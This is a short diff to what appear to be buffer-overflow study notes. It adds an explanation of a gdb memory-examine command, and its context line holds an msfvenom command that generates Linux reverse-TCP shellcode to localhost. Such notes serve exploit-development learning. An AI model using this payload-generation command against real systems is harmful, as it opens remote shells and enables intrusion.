@@ -29,3 +29,10 @@ MSF:
 
   msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
   
+  x/2000xb $esp+500
+    Where x is for examine, 2000 is the number of bytes requested to be examined, 
+    the second x displays the bytes formatted in hex, 
+    b specifies the unit in which the output is displayed (which in this case is bytes), 
+    and at last, $esp+500 specifies the starting display address
+
+  
